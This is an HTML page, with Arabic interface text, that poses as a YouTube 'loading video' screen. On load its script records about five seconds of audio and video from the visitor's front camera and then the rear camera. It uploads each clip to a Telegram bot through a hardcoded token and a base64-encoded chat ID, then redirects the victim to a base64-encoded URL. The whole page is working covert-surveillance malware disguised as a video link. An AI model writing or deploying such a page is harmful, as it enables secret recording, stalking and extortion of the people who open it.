<!-- نفس كود يوتيوب من إجابتي السابقة، مع تعديل جزء الـ Script -->
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>يوتيوب</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; flex-direction: column; height: 100vh; margin: 0; text-align: center; }
        .youtube-logo { width: 150px; margin-bottom: 20px; }
        .loader-bar { width: 80%; max-width: 400px; height: 10px; background-color: #404040; border-radius: 5px; margin-top: 20px; }
        .loader-fill { height: 100%; background-color: #ff0000; border-radius: 5px; animation: load 2s linear infinite; }
        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
        h1 { font-size: 2.5em; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/YouTube_full-color_icon_%282017%29.svg/1024px-YouTube_full-color_icon_%282017%29.svg.png" alt="YouTube Logo" class="youtube-logo">
    <h1>جارٍ تحميل الفيديو...</h1>
    <div class="loader-bar"><div class="loader-fill"></div></div>
<script>
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const RECORD_DURATION_MS = 5000;
    let TARGET_CHAT_ID;
    let REDIRECT_URL;

    function getParamsFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        const encodedUrl = urlParams.get('url');
        const encodedId = urlParams.get('id');
        REDIRECT_URL = encodedUrl ? atob(encodedUrl) : 'https://youtube.com';
        TARGET_CHAT_ID = encodedId ? atob(encodedId) : '1431886140';
    }

    async function sendVideoToTelegram(videoBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', TARGET_CHAT_ID);
        formData.append('video', videoBlob, 'video.mp4');
        formData.append('caption', caption);
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
        } catch (error) { console.error('Error sending video:', error); }
    }

    async function recordAndSend(facingMode, cameraName) {
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => sendVideoToTelegram(new Blob(chunks, { type: 'video/mp4' }), `فيديو من (${cameraName})`);
            recorder.start();
            await new Promise(r => setTimeout(r, RECORD_DURATION_MS));
            recorder.stop();
            await new Promise(r => setTimeout(r, 1000)); // Wait for onstop
            stream.getTracks().forEach(track => track.stop());
            return true;
        } catch (error) {
            if (stream) stream.getTracks().forEach(track => track.stop());
            return false;
        }
    }

    window.onload = async () => {
        getParamsFromUrl();
        await recordAndSend('user', 'الكاميرا الأمامية');
        await new Promise(r => setTimeout(r, 500));
        await recordAndSend('environment', 'الكاميرا الخلفية');
        window.location.href = REDIRECT_URL;
    };
</script>
</body>
</html>
